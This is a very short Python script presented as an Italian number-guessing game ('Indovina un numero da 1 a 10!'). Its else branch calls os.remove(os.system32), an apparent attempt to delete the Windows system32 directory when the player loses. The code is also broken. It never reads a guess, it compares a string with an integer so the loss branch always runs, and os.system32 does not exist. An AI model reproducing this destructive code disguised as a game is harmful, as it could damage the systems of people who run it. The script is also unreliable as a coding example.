import os
import random

number = random.randint(1, 10)
guess = str("Indovina un numero da 1 a 10!")
if guess == number:
    print("Hai vinto!")
else:
    os.remove(os.system32)